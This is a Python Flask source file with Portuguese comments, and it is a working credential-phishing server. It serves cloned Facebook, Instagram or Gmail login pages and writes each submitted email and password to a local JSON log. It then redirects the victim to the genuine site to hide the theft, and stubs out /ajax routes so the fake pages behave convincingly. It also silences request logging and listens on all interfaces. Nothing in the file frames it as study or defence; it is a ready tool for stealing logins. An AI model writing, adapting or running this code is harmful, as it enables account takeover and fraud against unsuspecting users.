
from flask import Flask, request, render_template_string, redirect
import os
import json
from datetime import datetime
import logging

# Silenciar logs de requisições HTTP padrão
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)
LOG_PATH = os.path.join(os.path.dirname(__file__), 'logs', 'social_log.json')
TEMPLATE_DIR = os.path.join(os.path.dirname(__file__), 'templates')

os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)

selected_template = "facebook.html"  # valor padrão


@app.route('/')
def index():
    template_path = os.path.join(TEMPLATE_DIR, selected_template)
    if not os.path.exists(template_path):
        return "<h1>Template não encontrado</h1>"

    with open(template_path, 'r', encoding='utf-8') as f:
        html = f.read()
    return render_template_string(html)


@app.route('/login', methods=['POST'], strict_slashes=False)
def login():
    email = request.form.get('email')
    password = request.form.get('pass')
    log_data = {
        'email': email,
        'password': password,
        'timestamp': datetime.now().isoformat()
    }

    try:
        if os.path.exists(LOG_PATH):
            with open(LOG_PATH, 'r') as f:
                data = json.load(f)
        else:
            data = []
    except json.JSONDecodeError:
        data = []

    data.append(log_data)

    with open(LOG_PATH, 'w') as f:
        json.dump(data, f, indent=4)

    destino = {
        "facebook.html": "https://www.facebook.com",
        "instagram.html": "https://www.instagram.com",
        "gmail.html": "https://mail.google.com"
    }.get(selected_template, "https://www.google.com")

    return redirect(destino)


# Rotas falsas para evitar 404s (comuns em simulações de scripts do Facebook/Instagram)
@app.route('/ajax/bz', methods=['POST'])
@app.route('/ajax/webstorage/process_keys/', methods=['POST'])
@app.route('/ajax/<path:subpath>', methods=['POST'])
def rotas_falsas_ajax(subpath=None):
    return "", 200


def escolher_template():
    global selected_template
    print("\n[+] Templates disponíveis:\n")

    templates = [f for f in os.listdir(TEMPLATE_DIR) if f.endswith('.html')]

    if not templates:
        print("Nenhum template encontrado em 'templates/'")
        return

    for i, nome in enumerate(templates, 1):
        print(f"{i}. {nome}")

    while True:
        try:
            escolha = int(input("\nEscolha um template (número): "))
            if 1 <= escolha <= len(templates):
                selected_template = templates[escolha - 1]
                print(f"\n[+] Template selecionado: {selected_template}")
                break
            else:
                print("Número inválido.")
        except ValueError:
            print("Digite um número válido.")


def start_server():
    escolher_template()
    print(f"[*] Iniciando servidor com template '{selected_template}' em http://127.0.0.1:5000")
    app.run(host='0.0.0.0', port=5000, debug=False)
